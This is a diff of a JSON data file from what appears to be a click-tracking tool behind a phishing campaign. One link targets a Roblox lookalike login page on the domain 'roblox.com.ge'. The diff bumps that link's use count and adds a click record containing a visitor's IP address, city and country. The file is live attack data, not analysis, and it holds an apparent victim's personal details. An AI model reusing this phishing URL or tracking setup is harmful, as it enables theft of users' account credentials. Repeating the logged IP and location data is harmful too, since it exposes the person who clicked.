@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1480,
+    "useCount": 1481,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12008,6 +12008,14 @@
         "city": "Benito Juarez",
         "flag": "🇲🇽",
         "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777438991975,
+        "ip": "194.44.146.10",
+        "country": "Ukraine",
+        "city": "Lviv",
+        "flag": "🇺🇦",
+        "countryCode": "UA"
       }
     ]
   },
